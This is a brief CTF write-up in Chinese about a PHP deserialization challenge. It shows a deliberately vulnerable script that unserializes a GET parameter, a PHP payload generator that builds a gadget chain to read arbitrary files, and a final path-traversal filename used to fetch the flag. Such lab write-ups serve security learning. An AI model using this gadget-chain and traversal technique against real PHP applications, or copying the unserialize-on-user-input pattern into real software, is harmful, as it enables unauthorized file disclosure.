#PHP 序列化

```php
<?php
include 'flag.php';
class pkshow
{
    function echo_name()
    {
        return "Pk very safe^.^";
    }
}

class acp
{
    protected $cinder;
    public $neutron;
    public $nova;
    function __construct()
    {
        $this->cinder = new pkshow;
    }
    function __toString()
    {
        if (isset($this->cinder))
            return $this->cinder->echo_name();
    }
}

class ace
{
    public $filename;
    public $openstack;
    public $docker;
    function echo_name()
    {
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if ($this->openstack->neutron === $this->openstack->nova) {
            $file = "./{$this->filename}";
            if (file_get_contents($file)) {
                return file_get_contents($file);
            } else {
                return "keystone lost~";
            }
        }
    }
}

if (isset($_GET['pks'])) {
    $logData = unserialize($_GET['pks']);
    echo $logData;
} else {
    highlight_file(__file__);
}

```

使得 ace 的 $docker=null 可以绕过

```php
<?php

class acp
{
    protected $cinder;
    public $neutron;
    public $nova;
    function __construct()
    {
        $this->cinder = new ace();
    }
}
class ace
{
    public $filename = 'flag.php';
    public $openstack;
    public $docker = null;
}

$p = new acp();

echo urlencode(serialize($p));

```

返回

```php
<?php
$heat="asdasdasdasd53asd3a1sd3a1sd3asd";
$flag="flag in /nssctfasdasdflag";
```

之后再改一下文件名 `$filename = '../nssctfasdasdflag'; `就可以
